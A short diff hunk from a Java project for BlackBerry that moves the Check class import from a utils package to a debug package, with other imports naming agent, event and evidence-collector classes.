@@ -20,13 +20,13 @@ import blackberry.action.SubAction;
 import blackberry.action.UninstallAction;
 import blackberry.agent.Agent;
 import blackberry.config.Conf;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.interfaces.Singleton;
 import blackberry.interfaces.UserAgent;
-import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
 /**
